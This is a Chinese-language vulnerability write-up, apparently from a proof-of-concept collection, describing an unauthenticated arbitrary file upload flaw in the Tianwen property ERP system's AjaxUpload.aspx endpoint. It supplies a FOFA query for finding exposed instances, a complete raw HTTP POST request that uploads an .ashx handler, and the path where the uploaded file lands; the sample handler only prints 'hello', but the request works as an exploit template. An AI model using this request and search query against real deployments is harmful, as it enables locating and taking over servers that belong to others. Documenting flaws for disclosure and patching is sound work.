# 天问物业ERP系统AjaxUpload.aspx前台任意文件上传漏洞

# 一、漏洞简介
成都天问互联科技有限公司以软件开发和技术服务为基础，建立物业ERP应用系统，向物管公司提供旨在降低成本、保障品质、提升效能为目标的智慧物管整体解决方案。天问物业ERP系统AjaxUpload.aspx存在文件上传漏洞，攻击者可以利用漏洞上传恶意文件获取服务器权限。

# 二、影响版本
+ 天问物业ERP系统

# 三、资产测绘
+ fofa`body="国家版权局软著登字第1205328号"`
+ 登录页面

![1693186922915-1f51f82b-7763-45ed-a0a0-77d42bbe6c25.png](./img/d6vB92k0Q8TnoVUk/1693186922915-1f51f82b-7763-45ed-a0a0-77d42bbe6c25-035158.png)

# 四、漏洞复现
```plain
POST /HM/M_Main/AjaxUpload.aspx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 487
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="UpFileData"; filename="1.ashx"

<% @ webhandler language="C#" class="AverageHandler" %> 
using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
    public bool IsReusable 
    { 
        get {
             return true; 
            } 
        } 
        public void ProcessRequest(HttpContext ctx) 
        { 
            ctx.Response.Write("hello"); 
        } 
    }
--00content0boundary00--
```

![1722408255216-15f7f99d-8425-464c-a984-65cd6460fb92.png](./img/d6vB92k0Q8TnoVUk/1722408255216-15f7f99d-8425-464c-a984-65cd6460fb92-880167.png)

上传文件位置

```plain
http://xx.xx.xx.xx/HM/M_Main/UploadFiles/PersonAdjunct/2023/08/202382894343759.ashx
```

![1693187101786-501c2a90-3793-4c83-bfab-d53d25af370e.png](./img/d6vB92k0Q8TnoVUk/1693187101786-501c2a90-3793-4c83-bfab-d53d25af370e-114616.png)



> 更新: 2024-08-12 17:21:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hev6npn6s7eab8t2>